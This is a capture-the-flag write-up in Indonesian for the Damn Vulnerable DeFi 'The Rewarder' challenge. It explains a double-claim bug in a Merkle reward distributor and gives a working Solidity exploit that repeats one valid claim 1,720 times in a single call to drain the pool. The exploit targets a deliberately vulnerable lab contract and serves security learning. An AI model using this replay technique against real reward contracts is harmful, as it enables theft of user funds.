# Damn Vulnerable DeFi — The Rewarder (Writeup)

> Status: **SOLVED** ✅ (`[PASS] test_theRewarder`)
> Goal: klaim sebanyak mungkin DVT + WETH dari `TheRewarderDistributor`, kirim ke `recovery`.
> Catatan: solusi ini **tanpa attacker contract** — langsung di test file, karena gak ada callback dan Merkle proof ngunci ke `msg.sender = player`.

---

## 1. Kontrak target

`TheRewarderDistributor` bagi-bagi reward pakai **Merkle tree**. Kita klaim lewat `claimRewards`, ngasih:
- `amount` yang mau diklaim,
- `proof` (Merkle proof yang mbuktiin kita berhak),
- `tokenIndex` / `batchNumber`.

Distributor verifikasi proof, transfer token, lalu nandain "udah diklaim" biar gak dobel.

---

## 2. Bug-nya (yang bikin bisa di-drain)

Inti bug ada di cara `claimRewards` nandain "sudah diklaim". Dia **transfer di SETIAP iterasi loop**, tapi cuma manggil `_setClaimed` (yang benerin tanda "sudah diklaim") **pas token berganti atau di klaim terakhir** — bukan tiap klaim.

Artinya: kalau kita kirim **klaim yang sama, valid, berkali-kali dalam SATU panggilan `claimRewards`**, tiap iterasi tetep transfer token, tapi tanda "sudah diklaim" baru diset di ujung. Jadi kita bisa klaim reward yang sama ratusan kali sekaligus → nguras pool.

(Alice gagal ngedrain karena dia klaim di **panggilan terpisah** — panggilan kedua kena cek `AlreadyClaimed`. Kuncinya: harus **satu** `claimRewards` dengan array klaim yang diulang-ulang.)

---

## 3. Detail data

- Player adalah beneficiary sah di **index 188** di kedua file JSON (dvt & weth).
- Amount per klaim:
  - DVT: `11524763827831882`
  - WETH: `1171088749244340`
- Berapa kali diulang biar pool abis:
  - DVT: 867 kali
  - WETH: 853 kali
  - Total array = 867 + 853 = **1720 klaim** dalam 1 panggilan.

---

## 4. Kode solusi

```solidity
function test_theRewarder() public checkSolvedByPlayer {
    // leaves buat hitung Merkle proof
    bytes32[] memory dvtLeaves  = _loadRewards("/test/the-rewarder/dvt-distribution.json");
    bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");

    // daftar token yang mau diklaim
    IERC20[] memory tokensToClaim = new IERC20[](2);
    tokensToClaim[0] = IERC20(address(dvt));
    tokensToClaim[1] = IERC20(address(weth));

    // array klaim: 867 DVT + 853 WETH = 1720, semua diulang-ulang
    Claim[] memory claims = new Claim[](867 + 853);

    // DVT: ulang klaim yang sama 867x
    for (uint256 i = 0; i < 867; i++) {
        claims[i] = Claim({
            batchNumber: 0,
            amount: 11524763827831882,
            tokenIndex: 0,
            proof: merkle.getProof(dvtLeaves, 188)   // player di index 188
        });
    }

    // WETH: ulang klaim yang sama 853x
    for (uint256 i = 867; i < 1720; i++) {
        claims[i] = Claim({
            batchNumber: 0,
            amount: 1171088749244340,
            tokenIndex: 1,
            proof: merkle.getProof(wethLeaves, 188)
        });
    }

    // SATU panggilan claimRewards dengan 1720 klaim
    distributor.claimRewards(claims, tokensToClaim);

    // kirim semua hasil ke recovery
    dvt.transfer(recovery, dvt.balanceOf(player));
    weth.transfer(recovery, weth.balanceOf(player));
}
```

---

## 5. Konsep yang dipelajari

- **Merkle tree / root / proof**: cara efisien mbuktiin "alamat X berhak amount Y" tanpa nyimpen semua data on-chain. `getProof(leaves, index)` bikin bukti buat daun ke-`index`.
- **Proof ngunci ke `msg.sender`**: makanya solusi ini gak butuh attacker contract — klaim harus atas nama player.
- **Baca JSON pakai `jq`**: buat nyari index & amount player di file distribusi.
- **Struct literal**: pakai `:` bukan `=` → `Claim({ batchNumber: 0, ... })`.
- **Bug logika loop**: transfer tiap iterasi tapi set-claimed cuma di ujung → celah double-claim dalam 1 tx.

## 6. Pelajaran keamanan

Update state "sudah diklaim" **sebelum atau setiap** transfer (checks-effects-interactions), jangan ditunda ke akhir/pas ganti token. Menunda penandaan = pintu buat replay klaim yang sama berkali-kali dalam satu transaksi.
